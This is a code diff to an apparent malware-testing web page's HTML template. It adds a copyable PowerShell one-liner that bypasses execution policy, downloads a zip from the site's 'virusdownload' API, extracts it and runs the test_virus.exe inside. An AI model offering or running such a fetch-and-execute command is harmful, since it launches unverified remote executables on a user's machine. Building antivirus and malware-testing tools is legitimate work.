@@ -44,7 +44,7 @@ Invoke-WebRequest -Uri "{{ data.url }}/api/virusdownload" -Method POST -Headers 
         <div id="ps-command-execute-box" style="display: none; margin-top: 10px;">
             <pre class="code-box">
     <code id="ps-command">
-Invoke-WebRequest -Uri "{{ data.url }}/api/virusdownload" -Method POST -Headers @{'Content-Type'='application/json'} -Body (@{api_key='{{ data.virus.virus_api }}'} | ConvertTo-Json) -OutFile "file.zip"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$testPath = 'C:\TestVirusPath'; $apiKey='{{ data.virus.virus_api }}'; $url='{{ data.url }}/api/virusdownload'; $zipPath = '$testPath\downloaded.zip'; $extractPath = '$testPath'; $exePath = '$extractPath\test_virus.exe'; if (-not (Test-Path $testPath)) { New-Item -ItemType Directory -Path $testPath -Force }; Invoke-WebRequest -Uri $url -Method POST -Headers @{ 'Content-Type'='application/json' } -Body (@{ api_key=$apiKey } | ConvertTo-Json) -OutFile $zipPath; if (Test-Path $zipPath) { Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force; if (Test-Path $exePath) { Start-Process -FilePath $exePath -Wait } else { Write-Host 'Executable file not found.' } } else { Write-Host 'Download failed or zip file is missing.' }"
     </code>
             </pre>
             <button class="btn btn-secondary copy-btn" data-target="ps-execute-command">Copy PowerShell Command</button>
